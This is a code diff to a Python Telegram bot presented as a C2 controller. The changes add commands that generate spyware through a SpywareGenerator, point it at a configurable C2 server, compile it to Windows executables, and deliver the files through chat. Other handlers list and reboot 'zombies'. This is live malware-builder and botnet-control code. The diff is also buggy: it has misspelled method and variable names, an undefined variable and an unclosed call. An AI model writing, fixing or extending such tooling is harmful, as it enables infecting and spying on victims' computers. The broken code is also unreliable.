@@ -3604,31 +3604,68 @@ async def generate_payload(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
         
-    filename = context.args[0]
-    if not filename.endwith('.exe'):
+    target_filename = context.args[0]
+    if not target_filename.endwith('.exe'):
         filename += '.exe'
         
-    custom_code = " ".join(context.args[1:]) if len(context.args) > 1 else None
+    await update.message.reply_text(f"Initiating payload generation for {targetfilename}...", parse_mode="Markdown")
     
-    generator = SpywareGenerator()
-    
-    # Step 1: Generate Python Source 
-    source_code = generator.generate_payload(C2_SERVER_IP, C2_SERVER_PORT, custom_code)
-    
-    # Step 2: Compile to Excutable
-    output_path = generator.compile_to_exe(source_code, filename)
-    
-    # Step 3: Calculate Hash
-    with open(output_path, 'rb') as f:
-        file_hash = hashlib.sha256(f.read()).hexdigest()
+    try:
+        generator = SpywareGenerator()
+        payload_code = generator.generate_payload(C2_SERVER_IP, C2_SERVER_PORT)
         
-    # Step 4: Send File to User
+        await update.message.reply_text("Compiling payload...")
+        output_path = generator.compile_to_exe(payload_code, target_filename)
+        
+        if os.path.exists(output_path):
+            await update.message.reply_document(document=open(output_path, 'rb'), caption=f"Payload {target_filename} generated successfully.\nC2 Target: {C2_SERVER_IP}:{C2_SERVER_PORT}")
+        else:
+            await update.message.reply_text("Payload generated but file output failed.")
+            
+    except Exception as e:
+        await update.message.reply_text(f"Error during generation: {str(e)}", parse_mode="Markdown")
+        logging.error(f"Payload generation failed: {e}")
+        
+async def cmd_starts(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Command: /starts
+    Display bot status and available commands.
+    """
     await update.message.reply_text(
-        f"Payload Generated Successfully!\n"
-        f"Filename: `{filename}`\n"
-        f"Target C2: {C2_SERVER_IP}:{C2_SERVER_PORT}\n"
+        f"Jripbot C2 Controller Initialized\n\n"
+        f"Status: Online\n"
+        f"Current C2 IP: {C2_SERVER_IP}\n"
+        f"Current C2 Port: {C2_SERVER_PORT}\n"
+        f"Admin Status: {'Confirmed' if update.effective_user.id in ADMIN_IDS else 'Guest'}\n\n"
+        f"Commands:\n"
+        f"/c2_server <IP> - Update C2 IP\n"
+        f"/generate <name> - Create and compile payload\n"
+        f"/statuss - Check system integrity"
     )
 
+async def cmd_statuss(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Command: /statuss
+    Checks if dependencies and output directories are ready.
+    """
+    if update.effective_user.id not in ADMIN_IDS:
+        await update.message.reply_text("Access Denied.")
+        return
+        
+    checks = [
+        ("Output Directory", os.path.exists(MALWARE_OUTPUT_DIR)),
+        ("Python Executable", os.path.exists(PYTHON_PATH)),
+        ("PyInstaller Module", subprocess.run([PYTHON_PATH, "-m", "PyInstaller", "-version"], capture_output=True).returncode == 0)
+    ]
+    
+    report = "System Check:\n"
+    all_ok = True
+    for name, cmd_statuss in checks:
+        report += f"{name}: {'OK' if cmd_statuss else 'FAIL'}\n"
+        if not cmd_statuss: all_ok = False
+            
+    status_msg = "System Ready." if all_ok else "System Configuration Issues Detected."
+    await update.message.reply_text(f"{status_msg}\n{report}", parse_mode="Markdown"
         
 # ---------------- GitHub Repository Manager (Phase 7) ----------------
 #
@@ -6091,7 +6128,10 @@ def main():
     app.add_handler(CommandHandler("pttune", cmd_pttune))
     app.add_handler(CommandHandler("ptcoverage", cmd_ptcoverage))
     app.add_handler(CommandHandler("purple_report", cmd_purple_report))
-    app.add_handler(CommandHandler("starts", start))
+    app.add_handler(CommandHandler("starts", cmd_starts))
+    app.add_handler(CommandHandler("statuss", cmd_statuss))
+    app.add_handler(CommandHandler("c2_server", set_c2_server))
+    app.add_handler(CommandHandler("generate", generate_payload))
     app.add_handler(CommandHandler("list", list_zombies))
     app.add_handler(CommandHandler("reboot", reboot_zombies))
     # cmd_bbreport existed but was never registered, so /bbreport was
